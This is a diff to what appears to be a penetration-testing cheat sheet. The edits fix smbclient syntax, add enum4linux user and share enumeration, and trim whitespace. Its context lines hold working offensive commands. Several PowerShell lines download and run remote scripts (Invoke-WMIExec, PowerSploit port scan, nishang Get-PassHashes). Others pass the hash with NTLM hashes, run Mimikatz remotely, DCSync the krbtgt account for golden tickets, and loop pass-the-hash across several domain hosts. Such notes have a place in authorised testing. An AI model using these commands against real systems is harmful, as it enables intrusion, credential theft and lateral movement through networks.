@@ -306,17 +306,24 @@ smbmap -R -H <IP>
 Basic connection:
 
 ```sh
-smbclient \\<IP>\<PATH> -U <USER> -P <PASSWORD>
+smbclient //<IP>/<SHARE> -U <USER> -P <PASSWORD>
 # Anonymous connection
-smbclient \\<IP>\<PATH> -N
+smbclient //<IP>/<SHARE> -N
 ```
-
 
 Get all files from remote:
 
 ```sh
 smbclient //<IP>/<PATH> -c "prompt OFF; recurse ON; cd '\<PATH>\'; lcd
 '<LOCAL_PATH>'; mget *"
+```
+
+It is possible to use `enum4linux` for those kind of things (syntax is a bit
+easier too):
+
+```sh
+enum4linux -U <IP> # enum users
+enum4linux -S <IP> # enum shares
 ```
 
 **Common exploits**:
@@ -1305,28 +1312,28 @@ Check: https://github.com/p3nt4/PowerShdll
 
 ### Pass the hash
 
-* Invoke a command Remotely 
+* Invoke a command Remotely
 
 ```powershell
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-WMIExec.ps1')
- 
+
  Invoke-WMIExec -Target SVHOST2  -Username Administrator -Hash 78560bbcf70110fbfb5add17b5dfd762 -Command "powershell whoami | out-file \\SVHOST2\C$\windows\thing.txt"
 ```
-* Invoke Mimikatz Remotely 
+* Invoke Mimikatz Remotely
 
 ```powershell
 Invoke-WMIExec -Target SVHOST2  -Username Administrator
 -Hash 78560bbcf70110fbfb5add17b5dfd762 -Command "powershell -Enc SQBFA...AoA"
 ```
-*  Pass The Hash with Mimikatz 
+*  Pass The Hash with Mimikatz
 
 ```powershell
  Invoke-Mimikatz -Command '"sekurlsa::pth /user:adm_maint /ntlm:cbe55f143fcb6d4687583af520123b89 /domain:lazuli"'
  ```
- 
+
 ### Kerberos
 
-*  Generate Golden Ticket (Domain Admin Required) 
+*  Generate Golden Ticket (Domain Admin Required)
 
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::dcsync /domain:LAZULI.CORP /user:krbtgt"'
@@ -1672,28 +1679,28 @@ dir -Path \\SVHOST1.LAZULI.CORP -Include "*pass*","*admin*","*secret*" -Recurse 
 ```
 
 Connect to MSSQL Database:
- 
+
  ```powershell
  IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/michaellwest/PowerShell-Modules/master/CorpApps/Invoke-SqlCommand.ps1')
 
-Invoke-SqlCommand -Server 172.11.14.89 -Database master -Username sa -Password  -Query "exec sp_databases" 
+Invoke-SqlCommand -Server 172.11.14.89 -Database master -Username sa -Password  -Query "exec sp_databases"
 ```
 
 Port Scanning:
- 
+
 ```powershell
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1')
 
 Invoke-Portscan -Hosts [ip] -TopPorts 50
 ```
 
-View Domain Controlers 
- 
+View Domain Controlers
+
 ```powershell
-nltest /dclist: 
+nltest /dclist:
 ```
 Get Hashes:
- 
+
 ```powershell
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1');Get-PassHashes
 ```
@@ -1705,7 +1712,7 @@ $hosts = @("SVDC1.LAZULI.CORP","SVFILES.LAZULI.CORP","SVHOST1.LAZULI.CORP","SVHO
 
 foreach ($h in $hosts){ Invoke-WMIExec -Target $h -Username Administrator -Hash 78560bbcf70110fbfb5add17b5dfd762 -Command "hostname" -Verbose }
 ```
- 
+
 
 
 ## (n)Vim tricks
